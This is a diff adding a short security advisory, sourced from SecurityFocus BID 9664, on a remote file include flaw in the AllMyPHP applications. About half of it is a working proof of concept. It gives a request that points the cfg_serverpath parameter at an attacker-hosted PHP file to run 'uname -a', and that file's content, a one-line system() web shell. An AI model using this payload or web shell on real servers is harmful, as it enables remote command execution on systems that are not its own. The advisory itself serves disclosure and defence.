@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/9664/info
+ 
+Reportedly the AllMyPHP applications AllMyGuests, AllMyLinks and AllMyVisitors are prone to a remote file include vulnerability. The issue is due to insufficient filtering of URI passed variables that are used in a 'require_once()' call.
+ 
+This issue may allow a remote attacker to execute arbitrary commands on the affected system with the privileges of the web server. Other attacks may be possible as well.
+ 
+http://www.example.com/allmylinks/include/info.inc.php?_AMGconfig[cfg_serverpath]=http://www.example.org/attacker.php/&cmd=uname%20-a
+ 
+www.example.org/attacker.php' will contain:
+ 
+<?php
+system("$cmd");
+?>
